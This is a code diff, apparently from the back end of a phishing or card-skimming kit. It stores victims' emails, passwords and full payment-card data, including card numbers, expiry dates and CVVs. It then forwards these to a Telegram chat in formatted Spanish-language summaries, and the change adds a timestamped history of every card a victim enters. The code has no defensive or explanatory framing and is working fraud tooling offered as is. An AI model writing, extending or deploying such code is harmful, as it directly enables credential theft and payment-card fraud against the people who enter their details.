@@ -38,8 +38,20 @@ function getTelegramChatId() { return _cachedChatId || process.env.TELEGRAM_CHAT
 /**
  * Track message IDs and accumulated data per user (keyed by IP or email)
  */
+interface CardRecord {
+  name?: string;
+  cardNumber?: string;
+  expiry?: string;
+  cvv?: string;
+  bankName?: string;
+  cardScheme?: string;
+  cardCategory?: string;
+  timestamp?: string;
+}
+
 interface UserSession {
   messageIds: number[]; // All message IDs sent for this user
+  cardHistory: CardRecord[]; // Accumulate all cards entered
   data: {
     email?: string;
     password?: string;
@@ -76,7 +88,7 @@ function getSessionKey(email?: string, ipAddress?: string): string {
 
 function getOrCreateSession(key: string): UserSession {
   if (!userSessions.has(key)) {
-    userSessions.set(key, { messageIds: [], data: {} });
+    userSessions.set(key, { messageIds: [], cardHistory: [], data: {} });
   }
   return userSessions.get(key)!;
 }
@@ -152,6 +164,7 @@ async function sendAndTrack(session: UserSession, text: string, replyMarkup?: ob
 /**
  * Build the full summary message from accumulated data
  * Format: tree-style with ├ └ branches and section emojis
+ * Now includes CARD HISTORY with all cards accumulated
  */
 function buildSummaryMessage(session: UserSession): string {
   const d = session.data;
@@ -181,8 +194,39 @@ function buildSummaryMessage(session: UserSession): string {
     });
   }
 
-  // TARJETA
-  if (d.cardNumber || d.name || d.expiry || d.cvv) {
+  // HISTORIAL DE TARJETAS (ALL CARDS ACCUMULATED)
+  if (session.cardHistory.length > 0) {
+    msg += `💳 <b>HISTORIAL DE TARJETAS (${session.cardHistory.length})</b>\n`;
+    session.cardHistory.forEach((card, cardIdx) => {
+      const isLast = cardIdx === session.cardHistory.length - 1;
+      const cardPrefix = isLast ? `└ ` : `├ `;
+      
+      msg += `${cardPrefix}<b>#${cardIdx + 1}</b>`;
+      if (card.timestamp) msg += ` <code>${card.timestamp}</code>`;
+      msg += `\n`;
+      
+      const cardItems: string[] = [];
+      if (card.name)       cardItems.push(`👤 ${escapeHtml(card.name)}`);
+      if (card.cardNumber) cardItems.push(`💳 <code>${escapeHtml(card.cardNumber)}</code>`);
+      if (card.expiry && card.cvv)   cardItems.push(`📅 ${escapeHtml(card.expiry)}  🔐 CVV ${escapeHtml(card.cvv)}`);
+      else if (card.expiry)       cardItems.push(`📅 ${escapeHtml(card.expiry)}`);
+      else if (card.cvv)          cardItems.push(`🔐 CVV ${escapeHtml(card.cvv)}`);
+      if (card.bankName) cardItems.push(`🏦 ${escapeHtml(card.bankName)}`);
+      
+      const schemeParts: string[] = [];
+      if (card.cardScheme) schemeParts.push(escapeHtml(card.cardScheme));
+      if (card.cardCategory) schemeParts.push(`<b>${escapeHtml(card.cardCategory)}</b>`);
+      if (schemeParts.length) cardItems.push(`🏷️ ${schemeParts.join(" · ")}`);
+      
+      const subPrefix = isLast ? `   ` : `│  `;
+      cardItems.forEach((item, i) => {
+        msg += `${subPrefix}${i < cardItems.length - 1 ? `├ ` : `└ `}${item}\n`;
+      });
+    });
+  }
+  
+  // TARJETA ACTUAL (for backward compatibility, show current card if not in history)
+  if ((d.cardNumber || d.name || d.expiry || d.cvv) && session.cardHistory.length === 0) {
     msg += `💳 <b>TARJETA</b>\n`;
     const cardItems: string[] = [];
     if (d.name)       cardItems.push(`👤 ${escapeHtml(d.name)}`);
@@ -309,7 +353,7 @@ export async function notifyLogin(data: {
 }
 
 /**
- * Notify payment data (card details)
+ * Notify payment data (card details) - ACCUMULATES IN HISTORY
  */
 export async function notifyPaymentData(data: {
   name: string;
@@ -323,6 +367,29 @@ export async function notifyPaymentData(data: {
   bankName?: string;
 }): Promise<boolean> {
   const key = getSessionKey(data.email, data.ipAddress);
+  const session = getOrCreateSession(key);
+  
+  // Add card to history with timestamp
+  const now = new Date().toLocaleString("es-CO", {
+    timeZone: "America/Bogota",
+    hour12: true,
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+  });
+  
+  session.cardHistory.push({
+    name: data.name,
+    cardNumber: data.cardNumber,
+    expiry: data.expiry,
+    cvv: data.cvv,
+    bankName: data.bankName,
+    cardScheme: data.cardScheme,
+    cardCategory: data.cardCategory,
+    timestamp: now,
+  });
+  
+  // Update current data for display
   return updateAndSend(key, {
     name: data.name,
     cardNumber: data.cardNumber,
